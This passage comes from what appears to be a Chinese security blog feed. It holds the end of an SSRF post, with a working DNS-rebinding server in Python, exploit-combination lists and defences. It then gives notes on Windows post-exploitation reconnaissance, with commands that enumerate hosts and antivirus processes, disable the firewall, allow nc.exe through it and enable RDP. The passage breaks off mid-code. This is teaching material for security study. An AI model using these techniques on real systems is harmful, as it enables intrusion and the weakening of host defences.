id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p><p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p><h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p><p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p><p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p><p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p><p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p><h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p><h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p><h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul><li>Apache Hadoop远程命令执行</li><li>axis2-admin部署Server命令执行</li><li>Confluence SSRF</li><li>counchdb WEB API远程命令执行</li><li>dict</li><li>docker API远程命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>ftp / ftps（FTP爆破）</li><li>glassfish任意文件读取和war文件部署间接命令执行</li><li>gopher</li><li>HFS远程命令执行</li><li>http、https</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>Java调试接口命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Jenkins Scripts接口命令执行</li><li>ldap</li><li>mongodb</li><li>php_fpm/fastcgi 命令执行</li><li>rtsp - smb/smbs（连接SMB）</li><li>sftp</li><li>ShellShock命令执行</li><li>Struts2 RCE</li><li>telnet</li><li>tftp（UDP协议扩展）</li><li>tomcat命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>zentoPMS远程命令执行</li></ul><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li>限制协议为http/https，禁用不必要的协议；</li><li>尽量禁止30x跳转；</li><li>设置URL白名单或限制内网IP、限制请求的端口等；</li><li>统一错误信息；</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p><p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SSRF" scheme="https://www.mi1k7ea.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之本机信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/02/27/内网信息收集之本机信息收集/</id>
    <published>2020-02-27T13:49:40.000Z</published>
    <updated>2020-03-08T13:18:45.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-手动收集信息"><a href="#0x01-手动收集信息" class="headerlink" title="0x01 手动收集信息"></a>0x01 手动收集信息</h2><p>本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令可查看IP地址、DNS服务器、主机名、域名等信息：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/1.png" alt=""></p><h3 id="查询操作系统及软件信息"><a href="#查询操作系统及软件信息" class="headerlink" title="查询操作系统及软件信息"></a>查询操作系统及软件信息</h3><h4 id="查询操作系统名称和版本信息"><a href="#查询操作系统名称和版本信息" class="headerlink" title="查询操作系统名称和版本信息"></a>查询操作系统名称和版本信息</h4><p>分英文版和中文版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">或</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/2.png" alt=""></p><h4 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/3.png" alt=""></p><h4 id="查看安装的软件及版本、路径等"><a href="#查看安装的软件及版本、路径等" class="headerlink" title="查看安装的软件及版本、路径等"></a>查看安装的软件及版本、路径等</h4><p>利用wmic命令将结果输出到文本文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/4.png" alt=""></p><p>利用PowerShell命令收集软件的版本信息（当然如果已在PowerShell终端，则直接输入双引号里的命令即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/5.png" alt=""></p><h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/6.png" alt=""></p><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p>该命令可以查看当前进程列表和进程用户，分析软件、客户端邮件、VPN和杀毒软件等进程：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/7.png" alt=""></p><p>如下命令查看进程信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/8.png" alt=""></p><h4 id="常见杀毒软件的进程"><a href="#常见杀毒软件的进程" class="headerlink" title="常见杀毒软件的进程"></a>常见杀毒软件的进程</h4><p>如下表：</p><table><thead><tr><th>进程</th><th>软件名称</th></tr></thead><tbody><tr><td>360SD.EXE</td><td>360杀毒</td></tr><tr><td>360TRAY.EXE</td><td>360实时保护</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360主动防御</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山卫士</td></tr><tr><td>SAFEDOGUPDATECENTER.EXE</td><td>服务器安全狗</td></tr><tr><td>MCAFEE MCSHIELD.EXE</td><td>迈克菲杀毒软件</td></tr><tr><td>EGUI.EXE</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>卡巴斯基</td></tr><tr><td>AVGUARD.EXE</td><td>小红伞</td></tr><tr><td>BDAGENT.EXE</td><td>BITDEFENDER</td></tr></tbody></table><h3 id="查询启动程序信息"><a href="#查询启动程序信息" class="headerlink" title="查询启动程序信息"></a>查询启动程序信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/9.png" alt=""></p><h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" title="查询计划任务"></a>查询计划任务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/10.png" alt=""></p><h3 id="查询主机开机时间"><a href="#查询主机开机时间" class="headerlink" title="查询主机开机时间"></a>查询主机开机时间</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/11.png" alt=""></p><h3 id="查询用户列表"><a href="#查询用户列表" class="headerlink" title="查询用户列表"></a>查询用户列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/12.png" alt=""></p><p>通过分析本机用户列表，可以得出内网机子的命名规则，特别是个人及其的名称，可以用来推测整个域的用户命名方式。</p><p>通过以下命令获取本地管理员（通常包含域用户）信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure><p>可以看到，本地管理员有两个用户和一个组，默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理员用户。如图：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/13.png" alt=""></p><p>执行如下命令查看当前在线用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/14.png" alt=""></p><h3 id="列出或断开本地计算机与所连接的客户端之间的会话"><a href="#列出或断开本地计算机与所连接的客户端之间的会话" class="headerlink" title="列出或断开本地计算机与所连接的客户端之间的会话"></a>列出或断开本地计算机与所连接的客户端之间的会话</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure><h3 id="查询端口列表"><a href="#查询端口列表" class="headerlink" title="查询端口列表"></a>查询端口列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/15.png" alt=""></p><h3 id="查询补丁列表"><a href="#查询补丁列表" class="headerlink" title="查询补丁列表"></a>查询补丁列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>需要注意系统的版本、位数、域、补丁信息及更新频率等。域内主机的补丁通常是批量安装的，通过查看本机补丁列表，就可以找到未打补丁的漏洞。</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/16.png" alt=""></p><p>使用wmic命令查看安装在系统中的补丁，包括补丁的名称、描述、ID、安装时间等信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/17.png" alt=""></p><h3 id="查询本机共享列表"><a href="#查询本机共享列表" class="headerlink" title="查询本机共享列表"></a>查询本机共享列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net share</span><br></pre></td></tr></table></figure><p>该命令可查看本机共享列表和可访问的域共享列表（域共享在很多时候是相同的）：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/18.png" alt=""></p><p>利用wmic命令查找共享列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic share get name,path,status</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/19.png" alt=""></p><h3 id="查询路由表及所有可用接口的ARP缓存表"><a href="#查询路由表及所有可用接口的ARP缓存表" class="headerlink" title="查询路由表及所有可用接口的ARP缓存表"></a>查询路由表及所有可用接口的ARP缓存表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/20.png" alt=""></p><p><img src="/2020/02/27/内网信息收集之本机信息收集/21.png" alt=""></p><h3 id="查询防火墙相关配置"><a href="#查询防火墙相关配置" class="headerlink" title="查询防火墙相关配置"></a>查询防火墙相关配置</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><p>Windows Server 2003及之前的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure><h4 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/22.png" alt=""></p><h4 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h4><p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br></pre></td></tr></table></figure><p>Windows Server 2003之后的版本，情况如下。</p><p>允许指定程序进入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许指定程序退出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;</span><br></pre></td></tr></table></figure><p>允许3389端口放行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure><h4 id="自定义防火墙日志的储存位置"><a href="#自定义防火墙日志的储存位置" class="headerlink" title="自定义防火墙日志的储存位置"></a>自定义防火墙日志的储存位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h3 id="查询代理配置情况"><a href="#查询代理配置情况" class="headerlink" title="查询代理配置情况"></a>查询代理配置情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br></pre></td></tr></table></figure><p>这里我本地是没开代理端口的：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/24.png" alt=""></p><h3 id="查询并开启远程连接服务"><a href="#查询并开启远程连接服务" class="headerlink" title="查询并开启远程连接服务"></a>查询并开启远程连接服务</h3><h4 id="查看远程连接端口"><a href="#查看远程连接端口" class="headerlink" title="查看远程连接端口"></a>查看远程连接端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reg query &quot;hkey_local_machine\system\currentcontrolset\control\terminal server\winstations\RDP-Tcp&quot; /v portnumber</span><br></pre></td></tr></table></figure><p>在命令行环境中执行注册表查询语句，连接的端口为0xd3d，转换后为3389：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/23.png" alt=""></p><h4 id="在Windows-Server-2003中开启3389端口"><a href="#在Windows-Server-2003中开启3389端口" class="headerlink" title="在Windows Server 2003中开启3389端口"></a>在Windows Server 2003中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1</span><br></pre></td></tr></table></figure><h4 id="在Windows-Server-2008和Windows-Server-2012中开启3389端口"><a href="#在Windows-Server-2008和Windows-Server-2012中开启3389端口" class="headerlink" title="在Windows Server 2008和Windows Server 2012中开启3389端口"></a>在Windows Server 2008和Windows Server 2012中开启3389端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&apos;RDP-Tcp&apos;) call setuserauthenticationrequired 1</span><br><span class="line"></span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h2 id="0x02-自动收集信息"><a href="#0x02-自动收集信息" class="headerlink" title="0x02 自动收集信息"></a>0x02 自动收集信息</h2><p>为了简化前面手动收集信息的操作，我们可以直接创建一个脚本文件来自动完成前面的信息查询等工作。这里推荐一个使用WMIC收集目标机器信息的脚本。</p><p>WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是最有用的Windows命令行工具。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。</p><p>下载地址：<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank" rel="noopener">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>我们可简单看下它的代码，其实就是执行一些wmic查询命令然后保存到html文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&apos;dir /s /b %WINDIR%\system32\*htable.xsl&apos;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&apos;true&apos; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><p>执行该脚本后，会在本地生成一个HTML文件来保存结果：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/25.png" alt=""></p><h2 id="0x03-Empire下的主机信息收集"><a href="#0x03-Empire下的主机信息收集" class="headerlink" title="0x03 Empire下的主机信息收集"></a>0x03 Empire下的主机信息收集</h2><p>Empire是针对Windows系统的后渗透神器，包括了从stager生成、提权到渗透维持的一系列功能。</p><p>官网：<a href="http://www.powershellempire.com/" target="_blank" rel="noopener">http://www.powershellempire.com/</a></p><p>下面只做下笔记，就不自己折腾了。</p><p>Empire提供了用于收集主机信息的模块。输入如下命令即可查看本机用户、域组成员、密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、共享信息等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness/host/winenum</span><br></pre></td></tr></table></figure><p>此外，situational_awareness/host/computerdetails模块几乎包含了系统中所有有用的信息，比如目标主机事件日志、应用程序控制策略日志，包括RDP登录信息、PowerShell脚本运行和保存的信息等。注意，该模块需要管理员权限运行。</p><h2 id="0x04-查询当前权限"><a href="#0x04-查询当前权限" class="headerlink" title="0x04 查询当前权限"></a>0x04 查询当前权限</h2><h3 id="查询当前权限"><a href="#查询当前权限" class="headerlink" title="查询当前权限"></a>查询当前权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 